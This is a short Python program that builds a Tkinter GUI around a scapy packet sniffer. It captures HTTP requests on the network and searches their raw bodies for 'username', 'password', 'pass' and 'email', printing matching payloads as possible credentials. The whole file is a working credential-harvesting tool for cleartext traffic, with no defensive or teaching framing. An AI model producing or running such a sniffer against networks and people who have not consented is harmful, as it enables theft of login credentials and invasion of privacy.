import argparse
from tkinter import Tk, Label, Button, scrolledtext, messagebox
from scapy.layers.http import HTTPRequest
from tkinter import messagebox
from scapy.all import sniff, Raw




class PacketSnifferApp:
    def __init__(self, master):
        self.master = master
        master.title("Packet Sniffer")
        master.geometry("600x400")

        self.label = Label(master, text="Click 'Start Sniffing' to begin packet sniffing.")
        self.label.pack()

        self.text_area = scrolledtext.ScrolledText(master, wrap='word', width=60, height=15)
        self.text_area.pack(padx=10, pady=10)

        self.start_button = Button(master, text="Start Sniffing", command=self.start_sniffing)
        self.start_button.pack()

    def process_packet(self, packet):
        """Processes the sniffed packet and prints any HTTP requests and potential usernames/passwords."""
        if packet.haslayer(HTTPRequest):
            http_request = packet[HTTPRequest]
            self.text_area.insert("end", f"[+] Http Request >> {http_request.Host}{http_request.Path}\n")
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode()
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load:
                        self.text_area.insert("end", f"[+] Possible {key} >> {load}\n\n")
                        break

    def start_sniffing(self):
        """Starts packet sniffing."""
        try:
            sniff(prn=self.process_packet, store=False)
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {str(e)}")

def main():
    root = Tk()
    app = PacketSnifferApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
